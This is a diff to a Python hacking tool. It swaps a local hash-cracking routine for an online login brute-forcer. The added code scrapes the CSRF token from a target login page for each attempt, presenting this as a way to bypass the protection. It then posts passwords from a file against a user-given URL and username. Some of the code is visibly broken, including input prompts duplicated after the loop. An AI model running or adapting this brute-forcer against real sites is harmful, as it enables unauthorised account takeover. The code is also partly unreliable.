@@ -15,8 +15,8 @@ import base64
 import os
 import struct
 import hashlib
-from hashcracker import crack_hash, online_lookup, banner as hash_banner
-from hashcracker import main as hashcracker_main
+import hash_cracker
+
 class BruteForceCracker:
 
     def __init__(self, url, username, error_message):
@@ -30,100 +30,98 @@ class BruteForceCracker:
                 sys.stdout.flush()
                 time.sleep(0.02)
 
+    def get_csrf_token(self):
+        """Extract CSRF token from login page"""
+        try:
+            response = self.session.get(self.url)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            
+            # Look for common CSRF token field names
+            csrf_field = soup.find('input', attrs={'name': re.compile(r'csrf|CSRF|token|_token', re.I)})
+            if csrf_field and csrf_field.has_attr('value'):
+                return csrf_field['name'], csrf_field['value']
+            
+            # Check meta tags
+            meta_token = soup.find('meta', attrs={'name': re.compile(r'csrf|CSRF|token', re.I)})
+            if meta_token and meta_token.has_attr('content'):
+                return meta_token['name'], meta_token['content']
+            
+            # Last resort: regex search
+            match = re.search(r'name=["\'](_csrf|csrf_token|CSRF|token)["\'] value=["\'](.*?)["\']', response.text)
+            if match:
+                return match.group(1), match.group(2)
+                
+            return None, None
+        except Exception as e:
+            print(f"Error getting CSRF token: {e}")
+            return None, None
 
-
-def crack_hash(hash_type, hash_value, wordlist):
-    try:
-        with open(wordlist, 'r', encoding='utf-8') as file:
-            for passwd in file:
-                passwd = passwd.strip()
-                if hash_type == "md5":
-                    hashed_pass = hashlib.md5(passwd.encode()).hexdigest()
-                elif hash_type == "sha1":
-                    hashed_pass = hashlib.sha1(passwd.encode()).hexdigest()
-                elif hash_type == "sha256":
-                    hashed_pass = hashlib.sha256(passwd.encode()).hexdigest()
-                elif hash_type == "sha512":
-                    hashed_pass = hashlib.sha512(passwd.encode()).hexdigest()
-                else:
-                    print("[!] Unsupported hash type")
-                    return
-
-                if hashed_pass == hash_value:
-                    print(f"[+] Password found: {passwd}")
-                    return
-            print("[-] Password not found in wordlist")
-    except FileNotFoundError:
-        print("[!] Wordlist file not found!")
-
-
-
-def online_lookup(hash_value):
-    print("[*] Searching online for hash...")
-    url = f"http://hashtoolkit.com/reverse-hash?hash={hash_value}"
-    response = requests.get(url)
-    
-    if response.status_code == 200:
-        if hash_value in response.text:
-            print("[+] Hash found online!")
-        else:
-            print("[-] Hash not found online.")
-    else:
-        print("[!] Failed to fetch data from HashToolKit.")
-
-
-def hash_cracker_wrapper():
-    """
-    Wrapper function to call hashcracker.main() with arguments
-    based on user input
-    """
-    # Get user input
-    hash_value = input("Enter hash to crack: ")
-    
-    print("\nSelect hash type:")
-    print("1. MD5")
-    print("2. SHA1")
-    print("3. SHA256")
-    print("4. SHA512")
-    hash_choice = input("Choose hash type (1-4): ")
-    
-    # Map choice to hash type
-    hash_types = {
-        '1': 'md5',
-        '2': 'sha1',
-        '3': 'sha256',
-        '4': 'sha512'
-    }
-    hash_type = hash_types.get(hash_choice, 'md5')
-    
-    print("\nChoose cracking method:")
-    print("1. Use wordlist")
-    print("2. Online lookup")
-    method = input("Choose method (1-2): ")
-    
-    # Save original sys.argv
-    original_argv = sys.argv.copy()
-    
-    try:
-        # Create new argument list
-        sys.argv = ['hashcracker.py', '-H', hash_value, '-T', hash_type]
+    def crack(self, password):
+        """Try a password against the target"""
+        token_name, token_value = self.get_csrf_token()
         
-        if method == '1':
-            wordlist = input("Enter path to wordlist: ")
-            sys.argv.extend(['-W', wordlist])
-        elif method == '2':
-            sys.argv.append('-O')
-        else:
-            print("Invalid choice")
-            return
+        data = {
+            "username": self.username,
+            "password": password,
+            "submit": "Login"
+        }
         
-        # Call the original main function
-        hashcracker_main()
-    finally:
-        # Restore original sys.argv
-        sys.argv = original_argv
+        if token_name and token_value:
+            data[token_name] = token_value
+        
+        try:
+            response = self.session.post(self.url, data=data)
+            if self.error_message not in response.text:
+                return True
+        except Exception as e:
+            print(f"Error during login attempt: {e}")
+        
+        return False
+
+
+def crack_passwords(passwords, cracker):
+    """Try a batch of passwords against the target"""
+    for password in passwords:
+        password = password.strip()
+        print(f"[*] Trying: {password}")
+        if cracker.crack(password):
+            print(f"\n[+] Password found: {password}")
+            return True
+    return False
+
 
 def brute_force_main():
+    url = input("Enter Target Url: ")
+    username = input("Enter Target Username: ")
+    error = input("Enter Wrong Password Error Message: ")
+    
+    print("\n[*] Checking if site uses CSRF protection...")
+    cracker = BruteForceCracker(url, username, error)
+    token_name, token_value = cracker.get_csrf_token()
+    
+    if token_name and token_value:
+        print(f"[+] CSRF token found: {token_name}")
+        print("[*] Will attempt to bypass by extracting and including token with each request\n")
+    else:
+        print("[-] No CSRF token found or using a different protection method\n")
+    
+    password_file = "db/user_agents.db"
+    if not os.path.exists(password_file):
+        print(f"Error: Password file '{password_file}' not found.")
+        print("Creating directory and sample password file...")
+        os.makedirs(os.path.dirname(password_file), exist_ok=True)
+        with open(password_file, "w") as f:
+            f.write("password123\nadmin\n123456\nroot\nqwerty\n")
+    
+    with open(password_file, "r") as f:
+        chunk_size = 1000
+        while True:
+            passwords = f.readlines(chunk_size)
+            if not passwords:
+                break
+            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
+            t.start()
+            t.join()
     url = input("Enter Target Url: ")
     username = input("Enter Target Username: ")
     error = input("Enter Wrong Password Error Message: ")
@@ -421,7 +419,12 @@ def main():
         # Run cryptographic file sender
         crypto_file_sender()
     elif choice == '3':
-        hash_cracker_wrapper()
+        # Run hash cracker with direct command input
+        from hash_cracker import hash_cracker_with_args
+        
+        print("Enter hash cracker command arguments (e.g. -H <hash> -T <type> -W <wordlist>):")
+        command = input()
+        hash_cracker_with_args(command)
     else:
         print("Invalid choice. Please select 1 - 3.")
         main()
